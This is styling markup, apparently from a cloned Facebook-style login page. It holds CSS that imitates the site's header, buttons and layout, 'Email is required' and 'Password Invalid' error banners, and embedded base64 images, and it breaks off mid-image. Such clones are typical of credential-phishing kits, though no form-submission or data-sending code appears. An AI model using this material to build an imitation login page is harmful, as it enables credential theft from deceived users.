<head>
  <meta charset="UTF-8">
</head>

<style>
    
	#DIV_41.email_error::before {
	    content:"Email is required";
	    color:#fff;
	    background:red;
	    padding:5px 10px;
	    border-radius:1px;
	    display:block;
	}

	#DIV_43.password_error::before {
	    content:"Password Invalid";
	    color:#fff;
	    background:red;
	    padding:5px 10px;
	    border-radius:1px;
	    display:block;
	}

	#DIV_43.password_error {
	    height: auto;
	}

	#DIV_41.email_error {
	    height: auto;
	}
	
    #DIV_2,#DIV_3,#DIV_4{perspective-origin:759.6px 41.5px;transform-origin:759.6px 41.5px}#DIV_4,#DIV_5{height:82px;font:normal normal normal normal 12px/16.08px Helvetica,Arial,sans-serif}#DIV_1,#DIV_2,#DIV_3,#DIV_4,#DIV_5,#DIV_6{font:normal normal normal normal 12px/16.08px Helvetica,Arial,sans-serif}#DIV_7,#H1_8{height:51.2px;perspective-origin:85px 25.6px;transform-origin:85px 25.6px;border:0 #1d2129;width:170px}#DIV_1,#DIV_2,#DIV_3,#DIV_5,#DIV_6,#DIV_7,#H1_8{border:0 #1d2129}#DIV_1,#DIV_14:after,#DIV_2,#DIV_3,#DIV_4,#DIV_5,#DIV_6,#DIV_6:after,#DIV_7,#H1_8{color:#1d2129;text-decoration:none solid #1d2129;column-rule-color:#1d2129;caret-color:#1d2129;outline:#1d2129 0}#A_9,#I_10{text-decoration:none solid #365899}#DIV_7,#H1_8,#I_10{width:170px}#DIV_14,#DIV_14:after,#DIV_6:after{perspective-origin:490px 0;transform-origin:490px 0}#DIV_12,#DIV_13,#DIV_18:after{perspective-origin:759.6px 0;transform-origin:759.6px 0}#DIV_18,#DIV_19{perspective-origin:759.6px 292.6px;transform-origin:759.6px 292.6px}#A_16,#DIV_18:after,#IMG_21,#U_11{display:block}#DIV_47,#DIV_53,#SPAN_48,#U_26{height:16px}#U_11,#U_26{left:-999999px}#DIV_28,#FORM_33{max-width:396px}#DIV_32,#FORM_33{perspective-origin:198px 122px;transform-origin:198px 122px}#DIV_14:after,#DIV_18:after,#DIV_41:after,#DIV_43:after,#DIV_6:after{clear:both;content:'"."';visibility:hidden}#DIV_24,#DIV_47{overflow:hidden}#A_16:before,#BUTTON_46:before,#I_10,#SPAN_48{display:inline-block}#SPAN_48:after,#SPAN_48:before{bottom:7px;height:1px;top:8px;width:9999px;perspective-origin:4999.5px .5px;transform-origin:4999.5px .5px;background:#ced0d4;position:absolute}#A_16,#A_50{background:#42b72a}#DIV_27,#DIV_28,#DIV_57{background:#fff}#DIV_14,#DIV_58,#DIV_6{margin:0 269.6px}#FORM_33,#H1_8,#UL_59,body{margin:0}#LI_60,#LI_61,#LI_63,#LI_65,#LI_67,#LI_71,#LI_73,#LI_75,#LI_77,#LI_79,#LI_81{vertical-align:top;list-style:none}#A_62,#A_64,#A_66,#A_68,#A_70,#A_72,#A_74,#A_76,#A_78,#A_80,#LI_60,#LI_61,#LI_63,#LI_65,#LI_69,#LI_71,#LI_73,#LI_75,#LI_77,#LI_79,#LI_81,#UL_59{list-style:none}#A_16:before,#A_50:before,#A_82:before,#BUTTON_46:before{perspective-origin:0 10px;transform-origin:0 10px;width:0}#TABLE_86,#TBODY_87{perspective-origin:507.6px 30px}#LI_61,#LI_63,#LI_65,#LI_67,#LI_69,#LI_73,#LI_75,#LI_77,#LI_79,#LI_81,#TD_109,#TD_132{padding:0 0 0 10px}#A_16,#IMG_21,#I_137,#SPAN_48:after,#SPAN_48:before,#U_11,#U_26{position:absolute}#DIV_146,#DIV_147{height:14.4px;width:980px;transform-origin:490px 7.2px}body{padding:0;height:100%}#DIV_1{perspective-origin:759.6px 403.8px;transform-origin:759.6px 403.8px}#DIV_2,#DIV_3{height:83px}#DIV_4{min-height:42px;background:linear-gradient(#4e69a2,#3b5998 50%) #3b5998;border-top:0 none #1d2129;border-right:0 none #1d2129;border-bottom:1px solid #133783;border-left:0 none #1d2129}#DIV_5{min-width:980px;perspective-origin:759.6px 41px;transform-origin:759.6px 41px}#DIV_6{height:51.2px;width:980px;perspective-origin:490px 32.1px;transform-origin:490px 32.1px;padding:13px 0 0}#DIV_14:after,#DIV_6:after{display:block;width:980px;border:0 #1d2129;font:normal normal normal normal 0/0 Helvetica,Arial,sans-serif}#DIV_7{float:left;font:normal normal normal normal 12px/16.08px Helvetica,Arial,sans-serif}#A_9,#H1_8{font:normal normal bold normal 14px/18.76px Helvetica,Arial,sans-serif}#A_9{color:#365899;cursor:pointer;column-rule-color:#365899;caret-color:#365899;border:0 #365899;outline:#365899 0}#I_10,#U_11{color:#365899;cursor:pointer;column-rule-color:#365899;caret-color:#365899;border:0 #365899;font:italic normal 700 normal 14px/18.76px Helvetica,Arial,sans-serif;outline:#365899 0}#I_10{background-position:0 0;height:34px;perspective-origin:85px 17px;transform-origin:85px 17px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAVQAAABCCAMAAAA/tN61AAAARVBMVEVMaXH///////////////////////////////////////////////////////////////////////////////////////+Gg3WpAAAAFnRSTlMAjggR5fSv/gECM9Rnwyh9cp4bSz9YI3/pFAAADLxJREFUeF7sle2qgzAQRMequbNqrB817/+oFytlU9ISqwUt5ID4ZycMh4XFEwIwb6fMWFvXtbWmz1oIjkTyPB+Gapy6rLe3Y8tc5iptNTbXzJi1YgRsu7r883DjoVKJydi6KE9RBo12cUW1qguJ/Fq4Zw6Xmp2lDAHjFJUaoZ1TuqTzd7xULXS8VO2yUiox2Fmp8ziJVC1zuFS3sFIqcenvxU8n1f2sVAJTOWe+KTVJFfvk9N31T1L/VGqUcV5UVbr74KZNJR7tlf0HN0m1c0IzfdfcGUBsJEkdai/hTCvEXpLUW+ElygpfIEkdC6+8ySFcwFbS9Sem0iufXUDsJm1q40vt+A2pSWrnS23w41KT1CR1i26S8ZGVUiOB2NtxyP1SeUcCqa+uP0WEy59YoAcC+EgA1JCij+rECqlcAuH8+7clmI014SdS+dJDIDVEBB7xjhpQhJERCmNShe/mP3o7NBrkuXVT/4u51jVJURiK4gVUvFvv/6hbAdxDCG3VzO58k5/2IaQOIZgE+1tPNaSi1vN5Xde51+aNePTUMKV9jxiOa7qOc9a1zWi0FhBC7AFhnkg1xptBA4Zde7wSInQP2eyS0tDY24czWKJrr+RrUg3EWrUEWbs+Mb5bbll3ZaL6ep66pvXSuGW25DIDgMtlM0qpL+toxD2oOvYaEON1HimEEOSLj56qj22M+PGNz90funfoxuwA513kYe1gybhNsyY9T6QiHV1IQNnrSfrXOKvoDcPWpoC22pVVazJNh4yB8PvlWlH0brazjiCi9NwIwhHLDFYlqUqdrk/x46S5R0F30xdmB5gdTdRFztCtm3agi6SiD5VMtdXq9SzOk2qVXhuv7JbwJ7V6EEhFX3Zy4XEqhGvDmwVpPbsWECCaVZOGMqn1RGMYvjsZUVH3VtTdbgCnDrCOubXh11+Urz+lqbLj28xKQUsieNjtyhKnHT0FyOPHU62AglST9mVzra8pclovRI9EEE0zKSmS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) 0 0/100% 100% no-repeat rgba(0,0,0,0);margin:17px 0 0}#U_11{bottom:296.8px;height:18.4px;right:1.00145e+06px;text-decoration:underline solid #365899;top:30px;width:65.36px;perspective-origin:32.67px 9.2px;transform-origin:32.67px 9.2px}#DIV_12,#DIV_13,#DIV_14,#SPAN_15,#SPAN_20,#SPAN_22{color:#1d2129;text-decoration:none solid #1d2129;column-rule-color:#1d2129;caret-color:#1d2129;border:0 #1d2129;font:normal normal normal normal 12px/16.08px Helvetica,Arial,sans-serif;outline:#1d2129 0}#DIV_14{bottom:0;left:0;position:relative;right:0;top:0;width:980px}#A_16,#A_16:before{color:#fff;cursor:pointer;text-decoration:none solid #fff;white-space:nowrap;column-rule-color:#fff;caret-color:#fff;font:normal normal bold normal 12px/26px Helvetica,Arial,sans-serif;outline:#fff 0;text-align:center;vertical-align:middle}#A_16{bottom:14px;height:26px;left:180px;right:711.31px;top:-42px;width:66.69px;justify-content:center;perspective-origin:44.34px 14px;transform-origin:44.34px 14px;border:1px solid #42b72a;border-radius:2px;padding:0 10px;transition:background-color .2s cubic-bezier(.08,.52,.52,1) 0s,box-shadow .2s cubic-bezier(.08,.52,.52,1) 0s,transform .2s cubic-bezier(.08,.52,.52,1) 0s}#A_50,#BUTTON_46{justify-content:center;transition:background-color .2s cubic-bezier(.08,.52,.52,1) 0s,box-shadow .2s cubic-bezier(.08,.52,.52,1) 0s,transform .2s cubic-bezier(.08,.52,.52,1) 0s;bottom:0;left:0;position:relative;right:0;top:0}#A_16:before{height:20px;border:0 #fff}#DIV_17,#DIV_18{font:normal normal normal normal 12px/16.08px Helvetica,Arial,sans-serif;color:#1d2129;text-decoration:none solid #1d2129;column-rule-color:#1d2129;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0}#DIV_17{bottom:0;left:0;position:relative;right:0;top:0;perspective-origin:759.6px 362.3px;transform-origin:759.6px 362.3px}#DIV_18{height:585.2px}#DIV_18:after{color:#1d2129;text-decoration:none solid #1d2129;column-rule-color:#1d2129;caret-color:#1d2129;border:0 #1d2129;font:normal normal normal normal 0/0 Helvetica,Arial,sans-serif;outline:#1d2129 0}#DIV_19,#DIV_23,#DIV_24,#IMG_21{color:#1d2129;column-rule-color:#1d2129;caret-color:#1d2129;font:normal normal normal normal 12px/16.08px Helvetica,Arial,sans-serif;text-decoration:none solid #1d2129}#DIV_19{background:#e9ebee;border:0 #1d2129;outline:#1d2129 0;padding:80px 0}#IMG_21{bottom:643.6px;height:1px;left:0;right:1518.2px;top:80px;visibility:hidden;width:1px;perspective-origin:.5px .5px;transform-origin:.5px .5px;border:0 #1d2129;outline:#1d2129 0}#DIV_23{height:56px;width:612px;perspective-origin:306px 34px;transform-origin:306px 34px;border:0 #1d2129;margin:auto;outline:#1d2129 0;padding:0 0 12px}#DIV_24{height:54px;max-width:570px;perspective-origin:306px 28px;transform-origin:306px 28px;background:#4080ff;border:1px solid #4080ff;border-radius:3px;outline:#1d2129 0;padding:0 0 0 40px}#I_25,#U_26{font:italic normal normal normal 12px/16.08px Helvetica,Arial,sans-serif;border:0 #1d2129;outline:#1d2129 0;color:#1d2129;column-rule-color:#1d2129;caret-color:#1d2129;display:block}#I_25{background-position:-42px -60px;float:left;height:20px;text-decoration:none solid #1d2129;width:20px;perspective-origin:10px 10px;transform-origin:10px 10px;background:url(data:image/png;base64,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